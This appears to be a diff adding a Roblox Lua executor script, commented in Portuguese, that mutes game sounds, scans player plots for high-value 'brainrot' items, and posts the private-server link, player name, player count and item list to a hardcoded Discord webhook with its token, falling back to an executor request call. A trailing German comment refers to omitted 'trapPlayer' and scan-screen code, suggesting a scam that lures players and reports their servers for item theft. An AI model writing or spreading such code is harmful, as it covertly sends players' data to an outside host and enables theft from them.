@@ -1,0 +1,201 @@
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1480586666916974816/h90040lnGSY-1qzfKO_yVnOKOymnCrHsdpZnmon7nv-fGue372JzIneMxDFD8ATayCAF"
+
+local Min_Gen = 1_000_000
+
+local locaisDaMusica = {
+    game.Workspace,
+    game.SoundService,
+}
+
+local nomesMusicasComuns = {
+    "music", "musica", "bgm", "background", "theme", "soundtrack", "song", "tema"
+}
+
+local function eMusica(som)
+    if not (som:IsA("Sound")) then
+        return false
+    end
+    
+    local nomeMinusculo = som.Name:lower()
+    for _, palavra in pairs(nomesMusicasComuns) do
+        if nomeMinusculo:find(palavra) then
+            return true
+        end
+    end
+    
+    for _, local_ in pairs(locaisDaMusica) do
+        if som:IsDescendantOf(local_) and som.Parent == local_ then
+            if som.Looped and som.TimeLength > 30 then
+                return true
+            end
+        end
+    end
+    
+    return false
+end
+
+local function processarSom(som)
+    if som:IsA("Sound") then
+        if not eMusica(som) then
+            som.Volume = 0
+        end
+    elseif som:IsA("SoundGroup") then
+        som.Volume = 0
+    end
+end
+
+-- Silenciar sons existentes (otimizado)
+task.spawn(function()
+    for _, descendente in pairs(game:GetDescendants()) do
+        processarSom(descendente)
+    end
+end)
+
+-- Silenciar sons novos
+game.DescendantAdded:Connect(function(descendente)
+    task.wait()
+    processarSom(descendente)
+end)
+
+local function formatNumberShort(n)
+    if not n or type(n) ~= "number" then return "$0" end
+    if n >= 1e9 then return string.format("$%.1fB", n/1e9):gsub("%.0B","B") end
+    if n >= 1e6 then return string.format("$%.1fM", n/1e6):gsub("%.0M","M") end
+    if n >= 1e3 then return string.format("$%.1fK", n/1e3):gsub("%.0K","K") end
+    return "$"..tostring(n)
+end
+
+local function parseValueFromText(s)
+    if not s then return 0 end
+    local num = s:match("([%d%.]+)")
+    if not num then return 0 end
+    local n = tonumber(num) or 0
+    if s:find("B") then return n*1e9 
+    elseif s:find("M") then return n*1e6 
+    elseif s:find("K") then return n*1e3 
+    else return n end
+end
+
+-- ▼ Função: BUSCAR BRAINROTS (otimizado)
+local function getBrainrots()
+    local results = {}
+    local plots = Workspace:FindFirstChild("Plots") or Workspace
+    
+    for _, plot in ipairs(plots:GetChildren()) do
+        local podiums = plot:FindFirstChild("AnimalPodiums") or plot:FindFirstChild("Podiums")
+        if podiums then
+            for _, pd in ipairs(podiums:GetChildren()) do
+                local base = pd:FindFirstChild("Base") or pd:FindFirstChildWhichIsA("BasePart")
+                local spawn = base and base:FindFirstChild("Spawn")
+                local att = spawn and spawn:FindFirstChild("Attachment")
+                local oh = att and att:FindFirstChild("AnimalOverhead")
+                local nameLbl = oh and oh:FindFirstChild("DisplayName")
+                local genLbl = oh and oh:FindFirstChild("Generation")
+                
+                if nameLbl and nameLbl:IsA("TextLabel") then
+                    local name = nameLbl.Text
+                    local genText = genLbl and genLbl.Text or "0"
+                    local valueNum = parseValueFromText(genText)
+                    
+                    if valueNum >= Min_Gen then
+                        local key = name.."|"..valueNum
+                        if results[key] then
+                            results[key].count += 1
+                        else
+                            results[key] = {name=name, value=valueNum, count=1}
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    local out = {}
+    for _, v in pairs(results) do table.insert(out, v) end
+    table.sort(out, function(a,b) return a.value > b.value end)
+    return out
+end
+
+-- ▼ Função: validar URL
+local function isValidUrl(str)
+    if type(str) ~= "string" or str == "" then return false end
+    return str:match("^https?://") and str:find(".", 1, true) and #str > 10
+end
+
+-- ▼ Função: obter número de jogadores
+local function getPlayersCount()
+    return #Players:GetPlayers()
+end
+
+-- ▼ Função: ENVIAR PARA DISCORD COM BRAINROTS
+local function sendToDiscord(link, playerCount, playerName, brainrots)
+    task.spawn(function()
+        local brainrotText = ""
+        if #brainrots > 0 then
+            brainrotText = "\n\n**Brainrots Encontrados:**\n"
+            for i, br in ipairs(brainrots) do
+                if i > 10 then break end
+                local formattedValue = formatNumberShort(br.value)
+                brainrotText = brainrotText .. string.format("`%d.` **%s** - %s (x%d)\n", 
+                    i, br.name, formattedValue, br.count)
+            end
+            brainrotText = brainrotText .. string.format("\n**Total:** %d brainrots de alto valor", #brainrots)
+        else
+            brainrotText = "\n\n**⚠️ Nenhum brainrot de alto valor encontrado**"
+        end
+        
+        local data = game:GetService("HttpService"):JSONEncode({
+            content = "@everyone",
+            embeds = {{
+                title = "[By Dev - wendel ]🔥 Novo Server Privado Detectado",
+                description = "**Link:**\n" .. link .. 
+                              "\n\n**👤 Jogador:** `" .. playerName .. "`" ..
+                              "\n**👥 Players no server:** `" .. playerCount .. "`" ..
+                              brainrotText,
+                color = #brainrots > 0 and 3066993 or 15158332,
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+                footer = { text = "Auto Moreira • Min: " .. formatNumberShort(Min_Gen) }
+            }}
+        })
+        
+        print("[WENDEL] Enviando dados para webhook...")
+        
+        local success, res = pcall(function()
+            return game:GetService("HttpService"):PostAsync(
+                WEBHOOK_URL, 
+                data, 
+                Enum.HttpContentType.ApplicationJson,
+                false,
+                {["Content-Type"] = "application/json"}
+            )
+        end)
+        
+        if not success then
+            warn("[WENDEL] Erro no envio:", res)
+            local altSuccess = pcall(function()
+                return request({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = data
+                })
+            end)
+            if altSuccess then
+                print("[WENDEL] Enviado via método alternativo!")
+            end
+        else
+            print("[WENDEL] Dados enviados com sucesso!")
+        end
+    end)
+end
+
+-- Rest des Codes bleibt unverändert (showScanScreen, trapPlayer, UI, etc.)
+-- ... (kopiere einfach den restlichen Code von deinem Original-Script hierher)
+
+print("Webhook atualizado! Made by Dev - wendel!")
